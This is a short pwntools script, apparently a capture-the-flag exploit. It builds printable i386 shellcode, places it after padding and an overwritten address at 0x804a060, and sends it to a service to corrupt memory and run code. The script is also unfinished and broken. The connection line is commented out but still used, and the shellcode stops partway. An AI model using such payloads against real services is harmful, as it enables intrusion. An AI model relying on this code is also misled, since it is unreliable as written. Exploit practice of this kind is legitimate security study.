from pwn import *

context.arch = 'i386'

# r = remote('127.0.0.1', 4000)
'''
disasm('LLLLY')
   0:   4c                      dec    esp
   1:   4c                      dec    esp
   2:   4c                      dec    esp
   3:   4c                      dec    esp
   4:   59                      pop    ecx

disasm('jDX4C')

disasm('')

'''


sh = (
    "LLLLY" + # set $ecx as the shellcode starting addr.
    'jDX4C' + # $eax = 1
    'jDX0A1' #
)

print disasm(sh)

payload = ( ''.ljust(17) +
        p32(0x804a060 + 17 + 4) +
        sh +
        'A' * 100
)


r.send(payload + '\n')
